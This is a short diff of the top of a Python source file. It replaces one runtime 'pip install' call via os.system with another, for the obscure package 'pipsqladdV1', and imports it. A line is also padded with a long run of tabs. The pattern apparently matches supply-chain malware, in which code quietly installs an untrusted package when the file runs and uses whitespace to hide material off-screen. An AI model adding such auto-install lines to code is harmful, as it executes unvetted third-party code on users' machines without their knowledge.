@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqltoolkitV1")
-import pythonsqltoolkitV1
+os.system("pip install pipsqladdV1")
+import pipsqladdV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
